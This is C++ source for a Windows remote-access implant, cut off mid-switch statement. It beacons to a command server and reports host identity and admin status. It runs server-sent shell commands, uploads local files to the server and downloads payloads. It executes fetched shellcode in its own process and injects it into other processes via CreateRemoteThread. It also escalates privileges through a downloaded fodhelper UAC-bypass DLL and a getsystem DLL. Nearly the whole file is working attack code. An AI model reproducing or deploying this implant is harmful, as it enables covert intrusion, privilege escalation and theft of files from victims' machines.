#define no_init_all
#define _CRT_SECURE_NO_WARNINGS
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <string>
#include <vector>
#include <wininet.h>
#include "json.hpp"
#include <direct.h>
#include <sstream>
#include <iomanip>
#include <stdlib.h>
#include <TlHelp32.h>
#include "Loader.h"


using json = nlohmann::json;
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ws2_32.lib")

#ifdef _DEBUG
#define VERBOSE 1 // Allows debug output
#else
#define VERBOSE 0
#endif

#if VERBOSE
#define PRINTF(f_, ...) printf((f_), __VA_ARGS__)
#define CERR(x) std::cerr << x
#define COUT(x) std::cout << x
#else
#define PRINTF(X)
#define CERR(x)
#define COUT(x)
#endif

// Configuration Constants
#define SERVER_IP "10.2.0.15"
#define SERVER_PORT 9832
#define API_ENDPOINT "/api/send"
#define SLEEP_TIME 10      // seconds between polling
#define USERAGENT "Mozilla/5.0"
#define C2SSL FALSE
#define MAX_RETRIES 3
#define RETRY_SLEEP 3000   // 3 seconds

// Global Agent ID
std::string agent_id;

// ------------------ Base64 Functions ------------------
std::string base64_encode(const std::string &in) {
	static const std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
	std::string out;
	int val = 0, valb = -6;
	for (unsigned char c : in) {
		val = (val << 8) + c;
		valb += 8;
		while (valb >= 0) {
			out.push_back(base64_chars[(val >> valb) & 0x3F]);
			valb -= 6;
		}
	}
	if (valb > -6)
		out.push_back(base64_chars[((val << 8) >> (valb + 8)) & 0x3F]);
	while (out.size() % 4)
		out.push_back('=');
	return out;
}

std::string base64_decode(const std::string &in) {
	std::string input = in;
	// Convert URL-safe characters to standard Base64 ones.
	for (auto &c : input) {
		if (c == '-') c = '+';
		else if (c == '_') c = '/';
	}
	std::string filtered;
	for (char c : input) {
		if (isalnum(c) || c == '+' || c == '/' || c == '=')
			filtered.push_back(c);
	}
	std::string out;
	std::vector<int> T(256, -1);
	std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
	for (int i = 0; i < 64; i++)
		T[base64_chars[i]] = i;
	int val = 0, valb = -8;
	for (unsigned char c : filtered) {
		if (c == '=') break;
		if (T[c] == -1) continue;
		val = (val << 6) + T[c];
		valb += 6;
		if (valb >= 0) {
			out.push_back(char((val >> valb) & 0xFF));
			valb -= 8;
		}
	}
	return out;
}

// ------------------ HTTP POST Functions ------------------
bool http_post(const std::string &jsonBody, std::string &response) {
	HINTERNET hSession = InternetOpenA(USERAGENT, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (!hSession) return false;
	HINTERNET hConnect = InternetConnectA(hSession, SERVER_IP, SERVER_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
	if (!hConnect) {
		InternetCloseHandle(hSession);
		return false;
	}
	DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_DONT_CACHE | INTERNET_FLAG_NO_UI | INTERNET_FLAG_KEEP_CONNECTION;
	if (C2SSL) flags |= INTERNET_FLAG_SECURE;
	HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", API_ENDPOINT, NULL, NULL, NULL, flags, 0);
	if (!hRequest) {
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return false;
	}
	const char* headers = "Content-Type: application/json; utf-8";
	BOOL sendResult = HttpSendRequestA(hRequest, headers, (DWORD)strlen(headers), (LPVOID)jsonBody.c_str(), (DWORD)jsonBody.size());
	if (!sendResult) {
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hSession);
		return false;
	}
	char buffer[1024];
	DWORD bytesRead = 0;
	std::string resp;
	while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
		buffer[bytesRead] = '\0';
		resp.append(buffer);
	}
	response = resp;
	InternetCloseHandle(hRequest);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hSession);
	return true;
}

bool sendHttpPost(const std::string &jsonBody, std::string &response) {
	int attempts = 0;
	bool success = false;
	while (attempts < MAX_RETRIES && !success) {
		if (http_post(jsonBody, response))
			success = true;
		else {
			attempts++;
			if (attempts < MAX_RETRIES) {
				CERR("HTTP POST failed. Retrying in " << RETRY_SLEEP << " ms...\n");
				Sleep(RETRY_SLEEP);
			}
		}
	}
	return success;
}

std::wstring StringToWString(const std::string &s) {
	int len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), -1, NULL, 0);
	std::wstring ws(len, L'\0');
	MultiByteToWideChar(CP_ACP, 0, s.c_str(), -1, &ws[0], len);
	if (!ws.empty() && ws.back() == L'\0')
		ws.pop_back();
	return ws;
}

// ------------------ System Information Functions ------------------
std::string get_username() {
	char username[MAX_COMPUTERNAME_LENGTH + 1] = { 0 };
	DWORD nameSize = 255;
	GetUserNameA(username, &nameSize);
	return std::string(username);
}

std::string get_hostname() {
	char hostname[MAX_COMPUTERNAME_LENGTH + 1] = { 0 };
	DWORD nameSize = 255;
	GetComputerNameA(hostname, &nameSize);
	return std::string(hostname);
}

std::string get_machine_guid() {
	HKEY hKey;
	char guid[256] = { 0 };
	DWORD bufLen = sizeof(guid);
	if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
		if (RegQueryValueExA(hKey, "MachineGuid", nullptr, nullptr, reinterpret_cast<LPBYTE>(guid), &bufLen) == ERROR_SUCCESS) {
			RegCloseKey(hKey);
			return std::string(guid);
		}
		RegCloseKey(hKey);
	}
	return "unknown-guid";
}

std::string get_os_version() {
	OSVERSIONINFOA info;
	ZeroMemory(&info, sizeof(info));
	info.dwOSVersionInfoSize = sizeof(info);
#pragma warning(push)
#pragma warning(disable:4996)
	GetVersionExA(&info);
#pragma warning(pop)
	return std::to_string(info.dwMajorVersion) + "." + std::to_string(info.dwMinorVersion) + " (" + std::to_string(info.dwBuildNumber) + ")";
}

int get_integrity() {
	BOOL isAdmin = FALSE;
	PSID adminGroup = NULL;
	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
		if (!CheckTokenMembership(NULL, adminGroup, &isAdmin))
			isAdmin = FALSE;
		FreeSid(adminGroup);
	}
	return isAdmin ? 4 : 3;
}

// ------------------ Injection Function ------------------
int Inject_CreateRemoteThread(HANDLE hProc, PVOID payload, SIZE_T payload_len)
{
	LPVOID pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!pRemoteCode)
	{
		PRINTF("VirtualAllocEx failed: %d\n", GetLastError());
		return -1;
	}
	if (!WriteProcessMemory(hProc, pRemoteCode, payload, payload_len, NULL))
	{
		PRINTF("WriteProcessMemory failed: %d\n", GetLastError());
		VirtualFreeEx(hProc, pRemoteCode, 0, MEM_RELEASE);
		return -1;
	}
	DWORD dummy;
	if (!VirtualProtectEx(hProc, pRemoteCode, payload_len, PAGE_EXECUTE_READ, &dummy))
	{
		PRINTF("VirtualProtectEx failed: %d\n", GetLastError());
		VirtualFreeEx(hProc, pRemoteCode, 0, MEM_RELEASE);
		return -1;
	}
	HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
	if (hThread == NULL)
	{
		PRINTF("CreateRemoteThread failed: %d\n", GetLastError());
		VirtualFreeEx(hProc, pRemoteCode, 0, MEM_RELEASE);
		return -1;
	}
	WaitForSingleObject(hThread, 2000);
	CloseHandle(hThread);
	VirtualFreeEx(hProc, pRemoteCode, 0, MEM_RELEASE);
	return 0;
}

// ------------------ Registration (ht==1) ------------------
bool RegisterWithServer() {
	json registerData = {
		{"machine_guid", get_machine_guid()},
		{"hostname", get_hostname()},
		{"username", get_username()},
		{"internal_ip", "192.168.1.100"},
		{"external_ip", "1.1.1.1"},
		{"os", get_os_version()},
		{"process_arch", 1},
		{"integrity", get_integrity()}
	};

	std::string encoded_data = base64_encode(registerData.dump());

	json request_data = {
		{"data", encoded_data},
		{"ht", 1}
	};

	std::string encoded_request = base64_encode(request_data.dump());

	json final_payload = { {"d", encoded_request} };

	std::string requestBody = final_payload.dump();
	std::string response;

	if (sendHttpPost(requestBody, response)) {
		json jsonResponse = json::parse(response);
		if (jsonResponse.contains("data")) {
			std::string decodedResponse = base64_decode(jsonResponse["data"].get<std::string>());
			json responseObj = json::parse(decodedResponse);
			if (responseObj.contains("agent_id")) {
				agent_id = responseObj["agent_id"].get<std::string>();
				PRINTF("[+] Registered successfully. Agent ID: %s\n", agent_id.c_str());
				return true;
			}
		}
	}
	return false;
}


bool ExecuteSetPrivShellcode(char* shellcode, size_t shellcodeSize) {
	// Allocate executable memory in the current process
	void* execMemory = VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (execMemory == NULL) {
		return false;
	}
	// Copy the shellcode into the allocated memory
	memcpy(execMemory, shellcode, shellcodeSize);
	// Change the memory protection to allow execution
	DWORD oldProtect;
	if (!VirtualProtect(execMemory, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect)) {
		VirtualFree(execMemory, 0, MEM_RELEASE);
		return false;
	}
	// Create a thread to execute the shellcode
	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMemory, NULL, 0, NULL);
	if (hThread == NULL) {
		VirtualFree(execMemory, 0, MEM_RELEASE);
		return false;
	}
	// Wait for the shellcode to finish executing
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	VirtualFree(execMemory, 0, MEM_RELEASE);
	return true;
}

std::string ExecuteShellCommand(const std::string &command) {
	BOOL ok = TRUE;
	HANDLE hStdInPipeRead = NULL;
	HANDLE hStdInPipeWrite = NULL;
	HANDLE hStdOutPipeRead = NULL;
	HANDLE hStdOutPipeWrite = NULL;
	SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };

	// Create the pipes for STDIN and STDOUT.
	if (!CreatePipe(&hStdInPipeRead, &hStdInPipeWrite, &sa, 0))
	{
		PRINTF("[DEBUG] Error: Failed to create STDIN pipe. Error: %d\n", GetLastError());
		return "Error: Failed to create STDIN pipe.";
	}
	if (!CreatePipe(&hStdOutPipeRead, &hStdOutPipeWrite, &sa, 0)) {
		PRINTF("[DEBUG] Error: Failed to create STDOUT pipe. Error: %d\n", GetLastError());
		return "Error: Failed to create STDOUT pipe.";
	}

	// Set up STARTUPINFO to redirect handles and hide the window.
	STARTUPINFOW si = { 0 };
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	si.hStdError = hStdOutPipeWrite;
	si.hStdOutput = hStdOutPipeWrite;
	si.hStdInput = hStdInPipeRead;

	PROCESS_INFORMATION pi = { 0 };
	std::wstring wCommandLine = L"cmd.exe /c " + StringToWString(command);
	PRINTF("[DEBUG] Executing command: %s\n", command.c_str());
	PRINTF("[DEBUG] Full command line: %ls\n", wCommandLine.c_str());

	if (!CreateProcessW(NULL,(LPWSTR)wCommandLine.c_str(),NULL,NULL,TRUE,0,NULL,NULL,&si,&pi))                                     
	{
		PRINTF("[DEBUG] Error: Failed to create process. Error: %d\n", GetLastError());
		return "Error: Failed to create process.";
	}

	// Wait for the process to finish
	if (WaitForSingleObject(pi.hProcess, 10000) == WAIT_TIMEOUT) {
		TerminateProcess(pi.hProcess, 0);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		CloseHandle(hStdOutPipeWrite);
		CloseHandle(hStdInPipeRead);
		return "Error: Process timed out.";
	}

	// Close unneeded pipe handles.
	CloseHandle(hStdOutPipeWrite);
	CloseHandle(hStdInPipeRead);

	// Read the output from the STDOUT pipe.
	std::string output;
	const DWORD BUFSIZE = 1024;
	char buffer[BUFSIZE + 1] = { 0 };
	DWORD dwRead = 0;
	ok = ReadFile(hStdOutPipeRead, buffer, BUFSIZE, &dwRead, NULL);
	while (ok && dwRead > 0) {
		buffer[dwRead] = '\0';
		output.append(buffer);
		ok = ReadFile(hStdOutPipeRead, buffer, BUFSIZE, &dwRead, NULL);
	}

	// Clean up all handles.
	CloseHandle(hStdOutPipeRead);
	CloseHandle(hStdInPipeWrite);
	DWORD dwExitCode = 0;
	GetExitCodeProcess(pi.hProcess, &dwExitCode);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	SecureZeroMemory(buffer, sizeof(buffer));

	return output;
}

std::string DownloadFilePayload(const json &task) {
	// Get the file identifier and task ID from the task object.
	std::string file_id = task["file_id"].get<std::string>();
	std::string task_id = task["id"].get<std::string>();

	// Build the DownloadStart request (ht == 7)
	json requestData = {
		{"agent_id", agent_id},
		{"task_id", task_id},
		{"file_id", file_id}
	};
	std::string encoded_data = base64_encode(requestData.dump());
	json request_data = {
		{"data", encoded_data},
		{"ht", 7}  // DownloadStart
	};
	std::string encoded_request = base64_encode(request_data.dump());
	json final_payload = { {"d", encoded_request} };
	std::string requestBody = final_payload.dump();

	std::string response;
	if (!sendHttpPost(requestBody, response))
		return "";

	// Parse the response directly 
	json downloadResponse = json::parse(response);

	std::string payload = "";
	if (downloadResponse.contains("chunk")) {
		// The server sends the chunk data base64-encoded.
		std::string chunk_encoded = downloadResponse["chunk"].get<std::string>();
		payload += base64_decode(chunk_encoded);
	}
	int next_chunk_id = 0;
	if (downloadResponse.contains("next_chunk_id"))
		next_chunk_id = downloadResponse["next_chunk_id"].get<int>();

	// Retrieve any additional chunks via DownloadChunk (ht == 8)
	while (next_chunk_id != 0) {
		json chunkRequestData = {
			{"file_id", file_id},
			{"chunk_id", next_chunk_id}
		};
		std::string encoded_chunk_data = base64_encode(chunkRequestData.dump());
		json chunk_request_data = {
			{"data", encoded_chunk_data},
			{"ht", 8} 
		};
		std::string encoded_chunk_request = base64_encode(chunk_request_data.dump());
		json final_chunk_payload = { {"d", encoded_chunk_request} };
		std::string chunkRequestBody = final_chunk_payload.dump();

		std::string chunkResponse;
		if (!sendHttpPost(chunkRequestBody, chunkResponse))
			break;
		json chunkDownloadResponse = json::parse(chunkResponse);
		if (chunkDownloadResponse.contains("chunk")) {
			std::string chunk_encoded = chunkDownloadResponse["chunk"].get<std::string>();
			payload += base64_decode(chunk_encoded);
		}
		if (chunkDownloadResponse.contains("next_chunk_id"))
			next_chunk_id = chunkDownloadResponse["next_chunk_id"].get<int>();
		else
			next_chunk_id = 0;
	}
	return payload;
}



// ------------------ Task Execution Functions (Client) ------------------
struct TaskResult {
	int status;      // 4 = Success, 5 = Failure, 6 = NotImplemented, 7 = Injection Failed
	std::string output;
};

TaskResult ExecuteTask(const json &task) {
	TaskResult result;
	int taskType = task["type"].get<int>();
	std::string input = "";
	if (task.contains("input"))
		input = task["input"].get<std::string>();

	switch (taskType) {
	case 1: // Terminate
		result.status = 4;
		result.output = "Terminating";
		ExitProcess(0);
		break;
	case 2: // Shell
	{
		std::string cmdOutput = ExecuteShellCommand(input);
		if (cmdOutput.find("Error:") != std::string::npos) {
			result.status = 5; // Fails
			result.output = cmdOutput;
		}
		else {
			result.status = 4; // Success
			result.output = cmdOutput;
		}
		break;
	}
	case 3: { // pwd
		char buffer[MAX_PATH];
		if (_getcwd(buffer, MAX_PATH)) {
			result.output = std::string(buffer);
			result.status = 4;
			PRINTF("[DEBUG] pwd result: %s\n", result.output.c_str());
		}
		else {
			result.output = "Failed to get current directory";
			result.status = 5;
			CERR("[DEBUG] _getcwd failed\n");
		}
		break;
	}
	case 4: { // cd
		if (SetCurrentDirectoryA(input.c_str())) {
			result.output = "Changed directory to " + input;
			result.status = 4;
		}
		else {
			result.output = "Failed to change directory to " + input;
			result.status = 5;
		}
		break;
	}
	case 5: { // whoami
		result.output = get_username();
		result.status = 4;
		break;
	}
	case 6: { // ps
		std::stringstream ss;
		ss << std::setw(8) << "PID" << " " << std::setw(8) << "Parent" << " "
			<< std::setw(6) << "Arch" << " " << std::setw(18) << "User" << " " << "Process Name" << "\n";
		ss << "-------------------------------------------------------------\n";

		HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (hSnapshot == INVALID_HANDLE_VALUE) {
			result.output = "Failed to create process snapshot";
			result.status = 5;
			break;
		}
		PROCESSENTRY32 pe32;
		pe32.dwSize = sizeof(PROCESSENTRY32);
		if (!Process32First(hSnapshot, &pe32)) {
			CloseHandle(hSnapshot);
			result.output = "Failed to retrieve first process";
			result.status = 5;
			break;
		}
		do {
			DWORD pid = pe32.th32ProcessID;
			DWORD ppid = pe32.th32ParentProcessID;
			std::string procName = pe32.szExeFile;
			std::string arch = "N/A";
			HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
			if (hProcess != NULL) {
				BOOL isWow64 = FALSE;
				typedef BOOL(WINAPI *LPFN_ISWOW64PROCESS)(HANDLE, PBOOL);
				LPFN_ISWOW64PROCESS fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(GetModuleHandleA("kernel32"), "IsWow64Process");
				if (fnIsWow64Process) {
					if (fnIsWow64Process(hProcess, &isWow64))
						arch = isWow64 ? "x86" : "x64";
				}
				CloseHandle(hProcess);
			}
			std::string user = "";
			ss << std::setw(8) << pid << " " << std::setw(8) << ppid << " " << std::setw(6) << arch << " "
				<< std::setw(18) << user << " " << procName << "\n";
		} while (Process32Next(hSnapshot, &pe32));
		CloseHandle(hSnapshot);
		result.output = ss.str();
		result.status = 4;
		break;
	}
	case 7: {
		if (!task.contains("file_id")) {
			result.output = "Download task missing file_id.";
			result.status = 5;
			break;
		}
		std::string dest_path = input;
		std::string file_data = DownloadFilePayload(task);
		if (file_data.empty()) {
			result.output = "Failed to download file data.";
			result.status = 5;
		}
		else {
			FILE *fp = fopen(dest_path.c_str(), "wb");
			if (fp == nullptr) {
				result.output = "Failed to open file for writing: " + dest_path;
				result.status = 5;
			}
			else {
				fwrite(file_data.data(), 1, file_data.size(), fp);
				fclose(fp);
				result.output = "File downloaded successfully to " + dest_path;
				result.status = 4;
			}
		}
		break;
	}
	case 8: {
		// "input" is the local file path on the client
		std::string file_path = input;

		// Open the file in binary mode.
		FILE* fp = fopen(file_path.c_str(), "rb");
		if (fp == nullptr) {
			result.output = "Failed to open file for reading: " + file_path;
			result.status = 5;
			break;
		}

		// Get the file size.
		fseek(fp, 0, SEEK_END);
		long file_size = ftell(fp);
		fseek(fp, 0, SEEK_SET);

		// Extract the file name from the path.
		size_t pos = file_path.find_last_of("\\/");
		std::string file_name = (pos != std::string::npos) ? file_path.substr(pos + 1) : file_path;

		// --- UploadStart (HT = 4) ---
		// Include "path" and an empty "content" field.
		json startData = {
			{"agent_id", agent_id},
			{"task_id", task["id"]},
			{"file_name", file_name},
			{"file_size", file_size},
			{"path", file_path},
			{"content", ""}  // Dummy content
		};
		std::string encodedStartData = base64_encode(startData.dump());
		json startPayload = {
			{"data", encodedStartData},
			{"ht", 4}  // UploadStart
		};
		std::string encodedStartPayload = base64_encode(startPayload.dump());
		json finalStartPayload = { {"d", encodedStartPayload} };
		std::string startRequestBody = finalStartPayload.dump();

		std::string startResponse;
		if (!sendHttpPost(startRequestBody, startResponse)) {
			result.output = "UploadStart failed (HTTP error).";
			result.status = 5;
			fclose(fp);
			break;
		}

		// Parse the server response to get the file id.
		std::string file_id;
		try {
			json startRespJson = json::parse(startResponse);
			// Check if the response is wrapped in "data"
			if (startRespJson.contains("data")) {
				std::string decoded = base64_decode(startRespJson["data"].get<std::string>());
				json respData = json::parse(decoded);
				if (respData.contains("id"))
					file_id = respData["id"].get<std::string>();
			}
			else if (startRespJson.contains("id")) {
				// Otherwise, check directly for "id"
				file_id = startRespJson["id"].get<std::string>();
			}
		}
		catch (...) {
			result.output = "Failed to parse UploadStart response.";
			result.status = 5;
			fclose(fp);
			break;
		}
		if (file_id.empty()) {
			result.output = "No file ID returned from UploadStart.";
			result.status = 5;
			fclose(fp);
			break;
		}

		// --- UploadChunk (HT = 5) ---
		const size_t CHUNK_SIZE = 4096;  // Adjust chunk size as needed.
		int chunk_id = 0;
		bool chunkError = false;

		while (!feof(fp)) {
			char buffer[CHUNK_SIZE];
			size_t bytesRead = fread(buffer, 1, CHUNK_SIZE, fp);
			if (bytesRead > 0) {
				std::string chunkData(buffer, bytesRead);
				std::string encodedChunk = base64_encode(chunkData);

				// Build JSON for this chunk.
				json chunkDataJson = {
					{"task_id", task["id"]},
					{"chunk_id", chunk_id},
					{"content", encodedChunk},  // Using "content" as expected by the server
					{"file_id", file_id}         // Include the file id from UploadStart
				};
				std::string encodedChunkData = base64_encode(chunkDataJson.dump());
				json chunkPayload = {
					{"data", encodedChunkData},
					{"ht", 5}  // UploadChunk
				};
				std::string encodedChunkPayload = base64_encode(chunkPayload.dump());
				json finalChunkPayload = { {"d", encodedChunkPayload} };
				std::string chunkRequestBody = finalChunkPayload.dump();

				std::string chunkResponse;
				if (!sendHttpPost(chunkRequestBody, chunkResponse)) {
					result.output = "UploadChunk failed at chunk " + std::to_string(chunk_id);
					result.status = 5;
					chunkError = true;
					break;
				}
				chunk_id++;
			}
		}
		fclose(fp);
		if (chunkError) {
			break;
		}

		// --- UploadEnd (HT = 6) ---
		json endData = {
			{"agent_id", agent_id},
			{"task_id", task["id"]},
			{"status", 4},      // 4 = Complete
			{"result", ""},     // Empty result
			{"file_id", file_id} // Optional: include if needed
		};
		std::string encodedEndData = base64_encode(endData.dump());
		json endPayload = {
			{"data", encodedEndData},
			{"ht", 6}  // UploadEnd
		};
		std::string encodedEndPayload = base64_encode(endPayload.dump());
		json finalEndPayload = { {"d", encodedEndPayload} };
		std::string endRequestBody = finalEndPayload.dump();

		std::string endResponse;
		if (!sendHttpPost(endRequestBody, endResponse)) {
			result.output = "UploadEnd failed (HTTP error).";
			result.status = 5;
			break;
		}

		result.output = "File uploaded successfully: " + file_name;
		result.status = 4;
		break;
	}

	case 9: { // ListPrivs task
		std::string shellcode = DownloadFilePayload(task);
		if (shellcode.empty()) {
			result.status = 5;
			result.output = "Failed to download listprivs shellcode.";
			break;
		}
		// Capture stdout from shellcode execution
		std::string output;
		HANDLE readPipe, writePipe;
		SECURITY_ATTRIBUTES saAttr = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
		if (!CreatePipe(&readPipe, &writePipe, &saAttr, 0)) {
			result.status = 5;
			result.output = "Failed to create pipe for listprivs.";
			break;
		}
		if (!SetStdHandle(STD_OUTPUT_HANDLE, writePipe)) {
			result.status = 5;
			result.output = "Failed to redirect stdout.";
			break;
		}

		bool execSuccess = ExecuteSetPrivShellcode((char*)shellcode.data(), shellcode.size());

		DWORD bytesRead;
		char buffer[4096];
		std::string shellOutput;
		while (ReadFile(readPipe, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
			shellOutput.append(buffer, bytesRead);
		}

		CloseHandle(readPipe);
		CloseHandle(writePipe);

		if (execSuccess) {
			result.status = 4;
			result.output = shellOutput;
		}
		else {
			result.status = 5;
			result.output = "Listpriv shellcode execution failed.";
		}
		break;
	}

	case 11: { // Remote Injection (scinject)
		if (!task.contains("file_id")) {
			result.output = "No shellcode provided.";
			result.status = 5;
			break;
		}
		int targetPid = 0;
		try {
			targetPid = std::stoi(input);
		}
		catch (...) {
			result.output = "Invalid PID provided: " + input;
			result.status = 5;
			break;
		}
		// Open the target process
		HANDLE hTarget = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
			PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, targetPid);
		if (!hTarget) {
			result.output = "Failed to open target process. Error: " + std::to_string(GetLastError());
			result.status = 5;
			break;
		}
		std::string shellcode_payload = DownloadFilePayload(task);
		if (shellcode_payload.empty()) {
			result.output = "Failed to download shellcode payload.";
			result.status = 5;
			CloseHandle(hTarget);
			break;
		}
		// Inject the shellcode into the target process.
		int injectStatus = Inject_CreateRemoteThread(hTarget, (PVOID)shellcode_payload.c_str(), shellcode_payload.size());
		if (injectStatus == 0) {
			result.output = "";
			result.status = 4;
		}
		else {
			result.output = "Remote injection failed.";
			result.status = 5;
		}
		CloseHandle(hTarget);
		break;
	}		 
	case 10: { // SetPriv task
			// Download the shellcode for the setpriv module from the server
		std::string shellcode = DownloadFilePayload(task);
		if (shellcode.empty()) {
			result.status = 5; // Failure
			result.output = "Failed to download setpriv shellcode.";
			break;
		}
		// Execute the shellcode using the self-injection mechanism
		bool execSuccess = ExecuteSetPrivShellcode((char*)shellcode.data(), shellcode.size());
		if (execSuccess) {
			// On success, mark the task as successful with an empty output string
			result.status = 4; // Success
			result.output = "";
		}
		else {
			result.status = 5; // Failure
			result.output = "Setpriv shellcode execution failed.";
		}
		break;
	}
			 // Replace BOTH case 12 and case 13 in your Main.cpp with these:

	case 12: { // BypassUAC
		// Check if file_id exists (DLL should be downloaded from server)
		if (!task.contains("file_id")) {
			result.output = "No DLL provided.";
			result.status = 5;
			break;
		}

		// Parse input: "1 <cmd w/ args>"
		std::string inputStr = task["input"].get<std::string>();
		std::istringstream iss(inputStr);
		std::string method;
		iss >> method;

		if (method != "1") {
			result.output = "Error: Only method 1 (fodhelper) is supported for bypassuac.";
			result.status = 5;
			break;
		}

		// Get command arguments
		std::string cmd;
		std::getline(iss, cmd);
		if (!cmd.empty() && cmd[0] == ' ')
			cmd.erase(0, 1);

		// Download the DLL from the server
		std::string dll_data = DownloadFilePayload(task);
		if (dll_data.empty()) {
			result.status = 5;
			result.output = "Failed to download BypassUAC DLL.";
			break;
		}

		// Write DLL to temporary location
		char tempPath[MAX_PATH];
		GetTempPathA(MAX_PATH, tempPath);
		std::string dllPath = std::string(tempPath) + "bypassuac.dll";

		FILE* fp = fopen(dllPath.c_str(), "wb");
		if (!fp) {
			result.status = 5;
			result.output = "Failed to write temporary DLL.";
			break;
		}
		fwrite(dll_data.data(), 1, dll_data.size(), fp);
		fclose(fp);

		// Load the DLL
		HMODULE hDll = LoadLibraryA(dllPath.c_str());
		if (!hDll) {
			DeleteFileA(dllPath.c_str());
			result.output = "Failed to load DLL.";
			result.status = 5;
			break;
		}

		// Get the ExecuteW function
		typedef LPWSTR(*BypassUACFunc)(LPCWSTR, DWORD);
		BypassUACFunc bypassFunc = (BypassUACFunc)GetProcAddress(hDll, "ExecuteW");
		if (!bypassFunc) {
			result.output = "Failed to get function ExecuteW from DLL.";
			result.status = 5;
			FreeLibrary(hDll);
			DeleteFileA(dllPath.c_str());
			break;
		}

		// Convert command to wide string
		int size_needed = MultiByteToWideChar(CP_UTF8, 0, cmd.c_str(), -1, NULL, 0);
		std::wstring wCommand(size_needed, 0);
		MultiByteToWideChar(CP_UTF8, 0, cmd.c_str(), -1, &wCommand[0], size_needed);

		// Execute the bypass
		LPWSTR pBypassResult = bypassFunc(wCommand.c_str(), (DWORD)(wCommand.length() + 1));
		if (pBypassResult != NULL) {
			result.output = "BypassUAC executed successfully.";
			result.status = 4;
			delete[] pBypassResult;
		}
		else {
			result.output = "BypassUAC failed.";
			result.status = 5;
		}

		// Cleanup
		FreeLibrary(hDll);
		DeleteFileA(dllPath.c_str());
		break;
	}

	case 13: { // Getsystem
		// Check if file_id exists (DLL should be downloaded from server)
		if (!task.contains("file_id")) {
			result.output = "No DLL provided.";
			result.status = 5;
			break;
		}

		// Parse input: "1 <cmd w/ args>"
		std::string input = task["input"].get<std::string>();
		std::istringstream iss(input);
		std::string method;
		iss >> method;

		if (method != "1") {
			result.status = 5;
			result.output = "Error: Only method 1 (pipe) is supported for getsystem.";
			break;
		}

		// Get command arguments
		std::string cmd;
		std::getline(iss, cmd);
		if (!cmd.empty() && cmd[0] == ' ')
			cmd.erase(0, 1);

		// Download the DLL from the server
		std::string dll_data = DownloadFilePayload(task);
		if (dll_data.empty()) {
			result.status = 5;
			result.output = "Failed to download Getsystem DLL.";
			break;
		}

		// Write DLL to temporary location
		char tempPath[MAX_PATH];
		GetTempPathA(MAX_PATH, tempPath);
		std::string dllPath = std::string(tempPath) + "getsystem.dll";

		FILE* fp = fopen(dllPath.c_str(), "wb");
		if (!fp) {
			result.status = 5;
			result.output = "Failed to write temporary DLL.";
			break;
		}
		fwrite(dll_data.data(), 1, dll_data.size(), fp);
		fclose(fp);

		// Load the DLL
		HMODULE hDll = LoadLibraryA(dllPath.c_str());
		if (!hDll) {
			DeleteFileA(dllPath.c_str());
			result.status = 5;
			result.output = "Failed to load DLL.";
			break;
		}

		// Get the ExecuteW function
		typedef LPWSTR(*ExecuteWFunc)(LPCWSTR, DWORD);
		ExecuteWFunc ExecuteW = (ExecuteWFunc)GetProcAddress(hDll, "ExecuteW");
		if (!ExecuteW) {
			result.status = 5;
			result.output = "Failed to get function ExecuteW from DLL.";
			FreeLibrary(hDll);
			DeleteFileA(dllPath.c_str());
			break;
		}

		// Convert command to wide string
		std::wstring wCmd(cmd.begin(), cmd.end());

		// Execute getsystem
		LPWSTR wResult = ExecuteW(wCmd.c_str(), static_cast<DWORD>(wCmd.size() + 1));
		if (wResult && wResult[0] == L'1') {
			result.status = 4;
			result.output = "Getsystem executed successfully.";
		}
		else {
			result.status = 5;
			result.output = "Getsystem failed.";
		}

		// Cleanup
		FreeLibrary(hDll);
		DeleteFileA(dllPath.c_str());
		break;
	}

	default:
